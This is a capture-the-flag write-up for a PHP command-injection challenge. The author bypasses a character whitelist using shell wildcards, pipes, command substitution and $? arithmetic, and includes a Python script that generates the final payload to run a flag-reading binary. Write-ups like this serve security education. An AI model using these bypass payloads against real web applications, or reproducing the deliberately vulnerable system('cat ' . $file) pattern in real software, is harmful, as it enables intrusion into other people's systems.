<h2>Shero</h2>

<blockquote>
  <p>We like cat, so don't abuse it please =(</p>
  
  <ul>
  <li>复读机</li>
  </ul>
</blockquote>

<p>The premise of this challenge was quite simple. We are given the following source code, with the goal of finding the flag somewhere on the server.</p>

<p>```php
<?php
    $file = $<em>GET['f'];
    if (!$file) highlight</em>file(<strong>FILE</strong>);</p>

<pre><code>if (preg_match('#[^.cat!? /\|\-\[\]\(\)\$]#', $file)) {
    die("cat only");
}

if (isset($file)) {
    system("cat " . $file);
}
</code></pre>

<p>?>
```</p>

<p>By supplying a <code>?f=</code> GET request parameter, we can run commands on the server. One problem though - the regex filter is more than a little restrictive.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 10.57.05 PM.png" alt="" /></p>

<p>This is the part where the challenge turns from a web challenge to a command injection filter bypass challenge :sob:</p>

<p>The list of allowed characters are as follows:</p>

<ul>
<li><code>.</code></li>
<li><code>c</code></li>
<li><code>a</code></li>
<li><code>t</code></li>
<li><code>!</code></li>
<li><code>?</code></li>
<li>&#x20;``&#x20;</li>
<li><code>/</code></li>
<li><code>|</code></li>
<li><code>-</code></li>
<li><code>[</code></li>
<li><code>]</code></li>
<li><code>(</code></li>
<li><code>)</code></li>
<li><code>$</code></li>
</ul>

<h3>Reading Arbitrary Files</h3>

<p>One trick to bypass the character filter and run commands other than <code>cat</code> is to use <a href="https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm">wildcards</a>. In particular, the <code>?</code> wildcard character is used to match any single character.</p>

<p>For example, using <code>cat /?tc/???t?</code>, we could read the <code>/etc/hosts</code> file.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.31.41 PM.png" alt="" /></p>

<p>Using <code>cat /????????</code> yielded this very interesting-looking binary. At first glance, it contained the string <code>readflag.c</code>, so we could guess that this binary is probably called <code>readflag</code> and it runs with elevated permissions to read a flag file somewhere (so that we need RCE instead of simple file reading)</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.25.14 PM.png" alt="" /></p>

<p>If we download the binary and open it up in a decompiler, we would see that we need to pass the string <code>sRPd45w_0</code> as an argument (<code>argv[1]</code>) in order to read the flag. This was the result of rearranging the letters in the string <code>P4s5_w0Rd</code>.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.33.44 PM.png" alt="" /></p>

<h3>Running Arbitrary Commands</h3>

<p>Since the <code>|</code> character is allowed, we are able to use piping to terminate the <code>cat</code> command and start a new command. For example, using <code>?f=| /??a???a?</code> will translate to <code>cat | /??a???a?</code>, which runs the <code>/readflag</code> binary.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.37.19 PM.png" alt="" /></p>

<h3>Passing the Argument</h3>

<p>Now comes the torturous part. How do we get arbitrary characters to use as the password?</p>

<p>One thing that might help is that <code>$()</code> is allowed, so we could use <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html">command substitution</a> to get the strings we need.</p>

<p>When reading the binary previously, we could see that the string <code>P4s5_w0Rd</code> is in the binary. If we could run <code>strings</code> on the binary, somehow extract only the password string, and rearrange the letters, we could use command substitution to pass the correct password as an argument.</p>

<p>We could run <code>/usr/bin/strings /readflag</code> using <code>/???/???/?t????? /??a???a?</code>&#x20;</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.51.19 PM.png" alt="" /></p>

<p>Now we need some way of filtering out the rest of the strings and only keeping the relevant <code>P4s5_w0Rd</code> string. I came across <a href="https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho">this writeup</a> of a similar command injection challenge where the author used <code>/etc/alternatives/nawk</code> to filter output using regex, so I decided to try something similar.</p>

<p>Luckily enough, many useful regex characters are allowed - in particular, <code>.</code>, <code>[</code> and <code>]</code> are very useful. This allowed me to construct a regex that leaves only the password string.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-09 at 11.56.15 PM.png" alt="" /></p>

<p>Using <code>/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/</code>, we can get the <code>P4s5_w0Rd</code> string!</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-10 at 12.00.36 AM.png" alt="" /></p>

<p>At this point, we could try passing in the string as an argument to <code>/readflag</code> using <code>$()</code>, but this will yield "Wrong Password!".</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-10 at 12.03.15 AM.png" alt="" /></p>

<h3>Rearranging the Letters</h3>

<p>We needed a way to rearrange <code>P4s5_w0Rd</code> into <code>sRPd45w_0</code>. It would be great if we could get characters of the string at specified indices - it sure is nice that a <a href="https://man7.org/linux/man-pages/man1/cut.1.html"><code>cut</code> command</a> exists for this very purpose!</p>

<p>By using <code>/???/???/c?t -cX</code>, we will get the character of the string at index X.</p>

<p>But how do we get numbers? It turns out that <code>$?</code> is one of the <a href="https://gnu.org/software/bash/manual/html_node/Special-Parameters.html">special parameters</a> in bash, containing the exit status code of the previous command. If the exit code is non-zero, then <code>$? / $?</code> will yield <code>1</code>, <code>$? / $? -- $? / $?</code> will yield <code>2</code>, and so on. If the exit code is zero, this method will lead to a division by zero error.</p>

<p>But how do we make the exit code non-zero? We just need to place an extra bogus command in front of it: <code>(a || /???/???/c?t -c$(($? / $?)))</code>.</p>

<p>Here's the script to generate the payload required to reconstruct the password string.</p>

<p>```python
original = "P4s5<em>w0Rd"
target = "sRPd45w</em>0"</p>

<p>final = ''
for char in target:
    idx = original.index(char)</p>

<pre><code>num = "$? / $?"

for i in range(idx):
    num += "-- $? / $?"

final += f"$(/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/ | (a || /???/???/c?t -c$(({num}))))"
</code></pre>

<p>print(final)
```</p>

<p>And here's the payload...</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-10 at 12.22.38 AM.png" alt="" /></p>

<h3>Putting It All Together</h3>

<p>All we need to do now is to use the output from the previous script and put it behind <code>/readflag</code>.</p>

<p><img src="../.gitbook/assets/Screenshot 2022-06-10 at 12.26.47 AM.png" alt="" /></p>

<p>and we get the flag: <code>grey{r35p3c7_70_b45h_m4573r_0dd14e9bc3172d16}</code>.</p>

<h3>References</h3>

<ul>
<li><a href="https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho">https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho</a>&#x20;</li>
</ul>
